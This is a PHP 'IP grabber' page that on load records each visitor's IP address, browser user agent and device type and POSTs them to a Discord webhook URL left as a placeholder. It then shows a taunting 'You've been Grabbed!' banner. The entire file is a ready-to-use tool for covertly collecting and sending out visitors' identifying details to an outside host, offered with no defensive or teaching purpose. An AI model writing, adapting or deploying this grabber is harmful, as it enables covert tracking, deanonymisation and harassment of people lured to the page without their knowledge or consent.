<?php

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ipList as $ip) {
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['REMOTE_ADDR']) && filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return 'UNKNOWN';
}

function getUserBrowser() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
}

function getUserDevice() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

    if (preg_match('/mobile/i', $userAgent)) {
        return 'Mobile';
    } elseif (preg_match('/tablet/i', $userAgent)) {
        return 'Tablet';
    } else {
        return detectOS($userAgent);
    }
}

function detectOS($userAgent) {
    $os = 'Unknown OS';

    if (preg_match('/windows nt/i', $userAgent)) {
        $os = 'Windows';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'Mac OS';
    } elseif (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/android/i', $userAgent)) {
        $os = 'Android';
    } elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) {
        $os = 'iOS';
    }

    return 'Desktop (' . $os . ')';
}

$userIP = getUserIP();
$userBrowser = getUserBrowser();
$userDevice = getUserDevice();

$webhookURL = "Put your discord webhook here!!!";

// Create a message with the user details
$data = array(
    "content" => "`📡`: " . $userIP . "\n`🌐`: " . $userBrowser . "\n`🖥️`: " . $userDevice
);

// Send the data to the Discord webhook
$options = array(
    "http" => array(
        "header" => "Content-Type: application/json",
        "method" => "POST",
        "content" => json_encode($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents($webhookURL, false, $context);

if ($result === FALSE) {
    echo "An error occurred while sending the message.";
} else {
    echo "";
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You've been Grabbed!</title>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            font-size: 4em;
            text-shadow: 2px 2px 8px #ff0000, 0 0 10px #ff0000, 0 0 20px #8b0000;
            animation: flicker 1.5s infinite alternate;
        }
        @keyframes flicker {
            0% {
                opacity: 1;
                text-shadow: 2px 2px 8px #ff0000, 0 0 10px #ff0000, 0 0 20px #8b0000;
            }
            50% {
                opacity: 0.7;
                text-shadow: 2px 2px 12px #ff3333, 0 0 12px #ff3333, 0 0 30px #b30000;
            }
            100% {
                opacity: 0.9;
                text-shadow: 2px 2px 15px #ff6666, 0 0 15px #ff6666, 0 0 40px #e60000;
            }
        }
    </style>
</head>
<body>
    <h1>You've been Grabbed!</h1>
</body>
</html>
